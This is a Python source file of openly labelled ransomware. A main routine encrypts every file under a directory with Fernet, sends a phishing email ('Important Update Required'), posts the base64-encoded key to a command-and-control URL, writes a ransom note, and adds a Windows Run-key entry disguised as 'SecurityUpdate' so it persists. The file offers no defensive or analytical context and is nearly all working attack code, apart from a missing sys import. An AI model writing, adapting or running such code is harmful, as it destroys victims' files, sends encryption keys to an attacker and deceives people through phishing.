import os
import smtplib
import requests
import winreg
import base64
from cryptography.fernet import Fernet
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def encrypt_file(file_path: str, key: bytes) -> None:
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def send_phishing_email(email: str, content: str) -> None:
    sender = 'your_email@example.com'
    password = 'your_password'
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = email
    msg['Subject'] = 'Important Update Required'
    msg.attach(MIMEText(content, 'plain'))
    server = smtplib.SMTP('smtp.example.com', 587)
    server.starttls()
    server.login(sender, password)
    server.send_message(msg)
    server.quit()

def send_key_to_c2(c2_url: str, key: bytes) -> None:
    data = {'key': base64.b64encode(key).decode()}
    response = requests.post(c2_url, json=data)
    if response.status_code != 200:
        print("Failed to send key to C2 server")

def create_ransom_note(directory: str, note: str) -> None:
    with open(os.path.join(directory, 'README.txt'), 'w') as note_file:
        note_file.write(note)

def ensure_persistence() -> None:
    key = winreg.HKEY_CURRENT_USER
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    value_name = 'SecurityUpdate'
    value_data = sys.argv[0]
    winreg.SetValueEx(winreg.CreateKey(key, key_path), value_name, 0, winreg.REG_SZ, value_data)

def ransomware_with_social_engineering(directory: str, note: str, c2_url: str, phishing_email: str) -> None:
    key = Fernet.generate_key()
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
    send_phishing_email('victim@example.com', phishing_email)
    send_key_to_c2(c2_url, key)
    create_ransom_note(directory, note)
    ensure_persistence()
